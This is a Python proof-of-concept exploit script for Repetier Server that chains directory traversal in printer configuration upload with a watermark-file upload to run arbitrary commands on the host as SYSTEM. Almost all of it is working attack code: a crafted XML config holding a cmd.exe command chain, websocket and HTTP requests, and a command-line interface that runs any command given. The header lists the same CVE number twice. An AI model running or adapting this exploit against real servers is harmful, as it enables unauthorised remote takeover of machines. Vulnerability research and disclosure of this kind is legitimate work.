############################################################
# Repetier Server - Remote Command Execution POC
#
# Author: b0yd
# Description:
# 
#    This POC exploits several vulnerabilities/feature in the 
#    Repetier Server 3D printer software that eventually lead
#    to command execution as SYSTEM on the target host. These
#    bugs can be referenced as CVE-2019-14450 & CVE-2019-14450
#
# Usage: 
#        
#    python rep_poc.py -i <IP Address> -f <function (exploit,cmd)> -c <command to run>
#
# Steps: 

# 1. Execute "python rep_poc.py -i <IP Address> -f exploit". This function creates
#    a new printer that exploits a directory traversal vulnerability that allows for the
#    creation of an extcommands.xml file. It then overwrites the printer configuration
#    file with a valid "extcommands" configuration because the application does not properly
#    check the root node of the supplied XML file. Once the file is overwritten, when the 
#    service is restarted, a new menu called "Close" should be created that will run
#    arbitrary commands listed in the watermark file.
#
# 2. Execute "python rep_poc.py -i <IP Address> -f cmd -c <command to run>". This function
#    writes the command supplied to the watermark file. It then runs the external command
#    registered in the exploit phase. Finally it collects output from the watermark file and
#    displays it.
#
############################################################

import websocket
import struct
import sys
import requests
import json
import argparse
import time
from collections import OrderedDict

printer_conf = '''<?xml version="1.0" encoding="UTF-8"?>
<config>
	<shape>
		<grid color="#454545" spacing="10"/>
		<rectangle color="#dddddd" xMax="200" xMin="0" yMax="200" yMin="0"/>
	</shape>
	<general>
		<name>401</name>
		<slug>..\database\extcommands</slug>
		<firmwareName>Repetier-Firmware</firmwareName>
		<printerVariant>cartesian</printerVariant>
		<active>true</active>
		<fan>false</fan>
		<fan2>false</fan2>
		<tempUpdateEvery>1</tempUpdateEvery>
		<pauseHandling>0</pauseHandling>
		<pauseSeconds>120</pauseSeconds>
		<sdcard>false</sdcard>
		<softwarePower>false</softwarePower>
		<defaultVolumetric>false</defaultVolumetric>
		<logHistory>true</logHistory>
		<useOwnModelRepository>true</useOwnModelRepository>
		<useModelFromSlug/>
	</general>
	<connection>
		<serial>
			<baudrate>115200</baudrate>
			<device>Select</device>
			<pingPong>false</pingPong>
			<inputBufferSize>127</inputBufferSize>
			<communicationTimeout>30</communicationTimeout>
		</serial>
		<lcdTimeMode>4</lcdTimeMode>
		<resetScript/>
	</connection>
	<movement>
		<xMin>0</xMin>
		<xMax>200</xMax>
		<xHome>0</xHome>
		<yMin>0</yMin>
		<yMax>200</yMax>
		<yHome>0</yHome>
		<zMin>0</zMin>
		<zMax>100</zMax>
		<zHome>0</zHome>
		<xyJerk>20</xyJerk>
		<zJerk>0.3</zJerk>
		<timeMultiplier>1</timeMultiplier>
		<movebuffer>16</movebuffer>
		<xySpeed max="200">100</xySpeed>
		<zSpeed max="2">2</zSpeed>
		<xyPrintAcceleration>1500</xyPrintAcceleration>
		<xyTravelAcceleration>2500</xyTravelAcceleration>
		<zPrintAcceleration>100</zPrintAcceleration>
		<zTravelAcceleration>100</zTravelAcceleration>
		<endstops all="true" x="true" y="true" z="true"/>
		<invert x="false" y="false" z="false"/>
		<G10Speed>50</G10Speed>
		<G10Distance>3</G10Distance>
		<G10LongDistance>50</G10LongDistance>
		<G11Speed>50</G11Speed>
		<G11ExtraDistance>0</G11ExtraDistance>
		<G11ExtraLongDistance>0</G11ExtraLongDistance>
		<G10ZLift>0</G10ZLift>
	</movement>
	<extruders/>
	<heatedBed cooldownPerSecond="0.02" heatupPerSecond="0.2" installed="false" lastTemp="60" maxTemp="120">
		<temperatures/>
	</heatedBed>
	<heatedChamber installed="false" maxTemp="100"/>
	<quickCommands/>
	<webcam>
		<method>0</method>
		<timelapseMethod>0</timelapseMethod>
		<staticUrl/>
		<dynamicUrl/>
		<orientation>0</orientation>
		<reloadInterval>3</reloadInterval>
		<timelapseInterval>20</timelapseInterval>
		<timelapseHeight>0.1</timelapseHeight>
		<timelapseLayer>1</timelapseLayer>
		<timelapseBitrate>1000</timelapseBitrate>
		<timelapseSelected>0</timelapseSelected>
		<timelapseFramerate>30</timelapseFramerate>
	</webcam>
	<properties/>
	<command>
        <name>Close</name>
        <execute>cmd.exe /c copy C:\\\\ProgramData\\\\Repetier-Server\\\\database\\\\watermark.png file.bat &amp; file.bat &gt; C:\\\\ProgramData\\\\Repetier-Server\\\\database\\\\watermark.png &amp; del file.bat</execute>
        <confirm>Sure</confirm>
	</command>
</config>'''

proxies = None
#Comment out if not using a proxy like Burp, etc
#proxies = {
#  'http': 'http://127.0.0.1:8080',
#  'https': 'http://127.0.0.1:8080',
#}

#Some rand
sess_val = "86!i%25U6509!CIDPeLF44w!wI1o4Lmj7f"

def create_extcmd_printer():
    params = {'name':'401',
              'slug':'..\database\extcommands',
              'errors':{}}
    json_msg = json.dumps({'action': 'createConfiguration',
                           'data': params,
                           'printer':'',
                           'callback_id':12})
    return json_msg
    
def create_exec_external_cmd():
    #{"action":"runExternalCommand","data":{"id":0},"printer":"","callback_id":1040}
    json_msg = json.dumps({'action': 'runExternalCommand',
                           'data': {"id":0},
                           'printer':'',
                           'callback_id':12})
    return json_msg

def exploit(ip_port):

    #Open websocket connection
    ws = websocket.create_connection("ws://" + ip_port + "/socket/?lang=en&sess=" + sess_val ) 
    
    #Send message to create printer
    msg = create_extcmd_printer()
    ws.send( msg )

    #Receive some messages
    for i in range(5):
        result =  ws.recv()            
    ws.close()

    #Upload config
    od = OrderedDict() 
    od["a"] = "upload"
    od["mode"] = 0
    od["slug"] = "..\database\extcommands"
    od["sess"] = sess_val
    od["name"] = "401"
    od["upload"] = ('401.xml',printer_conf)

    url = "/printer/pconfig?a=upload&mode=0&slug=..\database\extcommands&sess=" + sess_val + "&name=401&upload=[object+File]"
    response = requests.post( "http://" + ip_port +  url, files=od, proxies=proxies )
    ret = response.text
    
    if "Authorization required" in ret or "Invalid configuration file" in ret:
        print "[-] Exploit failed"
    else:
        print "[+] Exploit mayyyy have worked.... Now we wait for the service to restart."

def execute_cmd(ip_port, cmd):

    #Create websocket
    ws = websocket.create_connection("ws://" + ip_port + "/socket/?lang=en&sess=" + sess_val ) 
    result =  ws.recv()   
    #print result

    #Upload new command
    od = OrderedDict() 
    od["sess"] = sess_val
    od["name"] = "a.png"
    od["filename"] = ('a.png',cmd)
    
    url = "/timelapse/uploadWatermark?sess=" + sess_val + "&name=a.png&filename=[object+File]"
    response = requests.post( "http://" + ip_port +  url, files=od, proxies=proxies )
    ret = response.text
    if "ok" in ret:        
        #print ret      

        #Send message to create printer
        msg = create_exec_external_cmd()
        ws.send( msg )
        
        #Wait a little bit for it to finish
        time.sleep(5)
            
        #Get the result
        url = "/timelapse/watermark/BMvplT7p"
        addr = "http://" + ip_port +  url
        r = requests.get(addr, proxies=proxies, verify=False)
        print r.text        
    else:
        print "[-] Exploit failed"
        
    #Close websocket
    ws.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Command Execution Exploit for Repetier Server")
    parser.add_argument('-f', dest='func', help='Function to perform. (exploit, cmd)', required=True)  
    parser.add_argument('-c', dest='cmd', help='Command to execute. e.g. whoami', required=False)
    parser.add_argument('-i', dest='ip', help='IP Address of Repetier Server', required=True)    
    parser.add_argument('-p', dest='port', help="Listening Port", default='3344', required=False)    
    args = parser.parse_args()

    ip = args.ip
    port = args.port
    func = args.func
    cmd = args.cmd
    
    ip_port = ip + ":" + port
    
    if( func == 'exploit'):
        exploit(ip_port)
    elif( func == 'cmd' and cmd != None):
        execute_cmd(ip_port, cmd)
    else:
        print('[-] Unknown function. Options: exploit,cmd')
